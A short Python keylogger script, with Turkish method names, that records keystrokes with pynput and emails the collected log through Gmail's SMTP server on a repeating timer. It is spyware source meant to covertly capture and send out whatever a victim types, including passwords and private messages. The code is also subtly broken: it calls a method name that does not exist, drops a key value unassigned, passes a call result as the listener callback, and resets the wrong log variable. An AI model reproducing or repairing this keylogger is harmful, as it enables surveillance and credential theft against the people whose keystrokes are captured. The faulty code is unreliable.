import pynput.keyboard
import threading
import smtplib

log = ""


class Keylogger:

    def __init__(self, time_interval, email, password):
        print("kurucu metodun içindeyiz")
        self.log = ""
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key + " " + str(key) + " "
        self.append_to_log(current_key)

    def bildir(self):
        self.sendmail(self.email, self.password, self.log)
        log = ""
        timer = threading.Timer(5, self.bildir)
        timer.start()

    def mail_gonder(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        klavye_dinleyici = pynput.keyboard.Listener(on_press=self.process_key_press())
        with klavye_dinleyici:
            self.bildir()
            klavye_dinleyici.join()
